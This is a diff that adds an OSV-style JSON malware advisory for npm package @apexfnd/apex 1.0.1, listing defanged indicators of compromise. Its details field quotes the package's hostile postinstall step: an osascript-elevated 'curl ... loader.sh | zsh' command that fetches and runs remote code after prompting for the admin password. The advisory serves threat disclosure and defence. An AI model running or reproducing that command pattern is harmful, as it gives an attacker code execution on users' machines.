@@ -1,0 +1,69 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-7006",
+  "modified": "2026-07-21T23:35:49Z",
+  "published": "2026-07-21T23:34:24Z",
+  "summary": "Malicious code in @apexfnd/apex (npm)",
+  "details": "The postinstall hook in install.cjs downloads a binary from github[.]com/Apex-Foundation/copilot, and on macOS writes a temporary AppleScript that executes 'curl -fsSL hxxps://update[.]apex-arena-router[.]com/loader[.]sh | zsh' with administrator privileges via osascript, prompting the user for their admin password. The domain update[.]apex-arena-router[.]com is a remote code delivery endpoint. The package also downloads a platform-specific binary from GitHub releases.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@apexfnd/apex",
+        "purl": "pkg:npm/%40apexfnd/apex@1.0.1"
+      },
+      "versions": [
+        "1.0.1"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "leitwacht": {}
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/@apexfnd/apex/v/1.0.1"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-7006"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-07-21T23:34:24Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "update[.]apex-arena-router[.]com"
+        ],
+        "sha256": [
+          "d57c1047384241fdd2fdea6101fc5b0e4ee1db3d689d6a13be98312af85c60aa"
+        ],
+        "url_observed": [
+          "hxxps://github[.]com/Apex-Foundation/copilot/releases/download/v1[.]0[.]0/apex-darwin-arm64",
+          "hxxps://github[.]com/Apex-Foundation/copilot/releases/download/v1[.]0[.]0/apex-darwin-x64",
+          "hxxps://github[.]com/Apex-Foundation/copilot/releases/download/v1[.]0[.]0/apex-linux-x64",
+          "hxxps://github[.]com/Apex-Foundation/copilot/releases/download/v1[.]0[.]0/apex-windows-x64[.]exe",
+          "hxxps://update[.]apex-arena-router[.]com/loader[.]sh"
+        ]
+      }
+    }
+  }
+}
